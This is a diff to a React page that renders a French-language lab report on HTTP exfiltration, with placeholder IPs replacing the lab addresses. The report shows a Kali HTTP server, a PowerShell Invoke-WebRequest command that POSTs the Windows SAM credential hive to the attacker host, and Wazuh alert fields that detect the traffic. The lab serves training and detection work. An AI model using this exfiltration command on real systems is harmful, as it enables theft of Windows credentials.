@@ -6,7 +6,7 @@ export default function RapportExfiltration() {
       <ReportHeader
         title="Exfiltration HTTP non chiffrée"
         subtitle="Chapitre 6, Module 6 · MITRE T1048.003 (Exfiltration Over Unencrypted Non-C2 Protocol)"
-        meta="28 juin 2026 · Kali 192.168.56.100 → Windows Server 2022 192.168.56.101 · Wazuh 4.12.0"
+        meta="28 juin 2026 · Kali [KALI] → Windows Server 2022 [SERVEUR] · Wazuh 4.12.0"
       />
 
       <H2>1. Objectif</H2>
@@ -21,7 +21,7 @@ export default function RapportExfiltration() {
       <Cmd term="Kali">{`mkdir -p /tmp/exfil && cd /tmp/exfil
 python3 -m http.server 8888 --bind 0.0.0.0`}</Cmd>
       <H3>Étape 2 — Exfiltration depuis Windows (Living off the Land)</H3>
-      <Cmd term="Windows Server — PowerShell Admin">{`Invoke-WebRequest -Uri http://192.168.56.100:8888/sam.hive \`
+      <Cmd term="Windows Server — PowerShell Admin">{`Invoke-WebRequest -Uri http://[KALI]:8888/sam.hive \`
   -Method POST -InFile C:\\Windows\\Temp\\sam.hive`}</Cmd>
       <p>
         <span className="font-mono text-xs">Invoke-WebRequest</span> est un outil Windows légitime : aucun
@@ -70,7 +70,7 @@ docker exec single-node-wazuh.manager-1 /var/ossec/bin/wazuh-control restart`}</
           ['rule.description', 'Connexion vers port 8888 - possible exfiltration HTTP'],
           ['data.win.eventdata.image', 'powershell.exe'],
           ['data.win.eventdata.destinationPort', '8888'],
-          ['data.win.eventdata.destinationIp', '192.168.56.100 (Kali)'],
+          ['data.win.eventdata.destinationIp', '[KALI] (Kali)'],
           ['rule.mitre.id', 'T1048.003'],
         ]}
       />
